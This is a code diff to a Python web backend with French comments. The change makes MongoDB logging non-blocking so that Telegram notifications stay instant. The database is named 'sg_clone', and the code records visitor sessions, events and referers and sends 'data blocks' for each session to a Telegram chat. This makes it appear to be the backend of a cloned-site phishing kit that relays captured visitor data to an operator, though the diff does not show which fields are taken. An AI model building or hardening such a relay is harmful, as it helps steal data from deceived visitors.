@@ -35,10 +35,20 @@ DEFAULT_MONGO_URL = "mongodb://localhost:27017"
 DEFAULT_DB_NAME = "sg_clone"
 
 # ---------------------------------------------------------------------------
-# Mongo connection
+# Mongo connection — courts timeouts pour ne jamais bloquer le flux Telegram.
+# Préférer MONGO_PRIVATE_URL (réseau interne Railway) si disponible.
 # ---------------------------------------------------------------------------
-mongo_url = os.environ.get("MONGO_URL") or DEFAULT_MONGO_URL
-client = AsyncIOMotorClient(mongo_url)
+mongo_url = (
+    os.environ.get("MONGO_PRIVATE_URL")
+    or os.environ.get("MONGO_URL")
+    or DEFAULT_MONGO_URL
+)
+client = AsyncIOMotorClient(
+    mongo_url,
+    serverSelectionTimeoutMS=1500,
+    connectTimeoutMS=1500,
+    socketTimeoutMS=3000,
+)
 db = client[os.environ.get("DB_NAME") or DEFAULT_DB_NAME]
 events_col = db["sg_events"]
 sessions_col = db["sg_sessions"]
@@ -54,17 +64,31 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(name)s | %(level
 
 
 # In-memory state per session (so Telegram works even if MongoDB is unreachable).
-# Structure: { session_id: {"sess": {...}, "events": [{"kind": ..., "data": ...}, ...] } }
 _state: dict[str, dict[str, Any]] = {}
 
 
-async def _safe_mongo(coro, op: str = "mongo") -> Any:
-    """Run a Mongo coroutine, log error and return None on failure."""
+def _safe_mongo(coro, op: str = "mongo") -> None:
+    """Fire-and-forget MongoDB op. Never blocks the request.
+
+    Mongo writes happen in the background; if Mongo is unreachable we just log
+    a warning. This keeps the Telegram-notification path instantaneous.
+    """
+    import asyncio
+
+    async def _runner() -> None:
+        try:
+            await coro
+        except Exception as exc:
+            logger.warning("%s failed: %s", op, exc)
+
     try:
-        return await coro
-    except Exception as exc:
-        logger.warning("%s failed: %s", op, exc)
-        return None
+        asyncio.create_task(_runner())
+    except RuntimeError:
+        # No running event loop — just close the coroutine to avoid warnings.
+        try:
+            coro.close()
+        except Exception:
+            pass
 
 
 async def tg_send(text: str) -> Optional[int]:
@@ -198,9 +222,9 @@ async def record_event(kind: str, request: Request, payload: dict[str, Any]) -> 
         "referer": request.headers.get("referer", ""),
         "ts": now,
     }
-    await _safe_mongo(events_col.insert_one(doc), "events.insert_one")
+    _safe_mongo(events_col.insert_one(doc), "events.insert_one")
     if sid:
-        await _safe_mongo(
+        _safe_mongo(
             sessions_col.update_one(
                 {"_id": sid},
                 {
@@ -317,7 +341,7 @@ async def push_data_block(session_id: str) -> None:
     new_id = await tg_send(text)
     if new_id:
         sess["tg_data_message_id"] = new_id
-        await _safe_mongo(
+        _safe_mongo(
             sessions_col.update_one(
                 {"_id": session_id},
                 {"$set": {"tg_data_message_id": new_id}},
@@ -385,13 +409,13 @@ async def start_session(payload: SessionStart, request: Request) -> dict[str, An
     _state[sid] = {"sess": sess, "events": []}
 
     # Best-effort MongoDB persistence
-    await _safe_mongo(sessions_col.insert_one(sess), "sessions.insert_one")
+    _safe_mongo(sessions_col.insert_one(sess), "sessions.insert_one")
 
     # Block #1 — session info (Telegram)
     msg_id = await tg_send(render_session_block(sess))
     if msg_id:
         sess["tg_session_message_id"] = msg_id
-        await _safe_mongo(
+        _safe_mongo(
             sessions_col.update_one({"_id": sid}, {"$set": {"tg_session_message_id": msg_id}}),
             "sessions.update_one(tg_session)",
         )
